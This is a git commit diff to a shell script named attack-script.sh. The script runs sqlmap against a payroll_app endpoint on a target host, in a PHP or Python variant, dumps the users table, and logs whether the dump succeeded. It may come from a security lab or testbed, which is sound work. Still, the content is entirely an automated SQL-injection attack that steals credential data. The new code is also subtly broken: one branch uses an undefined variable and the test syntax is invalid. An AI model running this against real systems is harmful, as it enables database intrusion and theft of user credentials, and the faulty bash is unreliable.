e177283fbaee0c27dc07eeebb80f89e6cc3dd107
Harrison Pratt <hpratt99@gmail.com>
2020-04-07 12:27:39 -0500

    updated attack

--- attack-script.sh
+++ attack-script.sh
@@ -6,10 +6,25 @@ if [ $SERVER == "php" ]
 then 
 	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
+	FILE=~/users.csv
+	if [ test -f "$FILE" ]
+	then
+		echo "Attack Successful" >> ~/attack-log.txt
+	else
+		echo "Attack Failed" >> ~/attack-log.txt
+	fi
+	rm ~/users.csv
 elif [ $SERVER == "python" ]
 then
 	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump
-	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/  
+	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
+	if [ test -f "$FILE" ]
+	then
+		echo "Attack Successful" >> ~/attack-log.txt
+	else
+		echo "Attack Failed" >> ~/attack-log.txt
+	fi
+	rm ~/users.csv
 else
 	echo "Not valid."
 fi
